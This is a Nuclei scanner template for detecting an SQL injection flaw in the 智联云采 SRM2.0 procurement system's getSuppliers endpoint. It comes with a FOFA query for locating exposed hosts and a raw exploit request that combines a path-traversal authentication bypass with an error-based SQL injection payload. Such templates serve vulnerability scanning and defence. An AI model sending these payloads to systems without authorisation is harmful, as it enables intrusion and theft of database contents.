id: zlyc-sm2-getsuppliers-sqli

info:
  name: 智联云采SRM2.0 getSuppliers - SQL Injection
  author: qwtd
  severity: high
  description: 智联云采getSuppliers存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 此漏洞获取数据库中的信息。
  reference:
    - https://wiki.wy876.cn/#/./%E6%99%BA%E4%BA%92%E8%81%94%E7%A7%91%E6%8A%80%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/SRM%E6%99%BA%E8%81%94%E4%BA%91%E9%87%87%E7%B3%BB%E7%BB%9FgetSuppliers%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
  metadata:
    max-request: 2
    vendor: 智联云采
    product: SRM2.0
    fofa-query: title=="SRM 2.0"
  tags: 智联云采SRM2.0

http:
  - raw:
      - |
        GET /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=1%27+AND+GTID_SUBSET%28CONCAT%280x7e%2C%28SELECT+md5%281234%29%29%2C0x7e%29%2C7973%29--+WkOF&name=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.9
        X-Requested-With: XMLHttpRequest
        Accept-Encoding: gzip

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "java.sql.SQLException"

      - type: status
        status:
          - 500

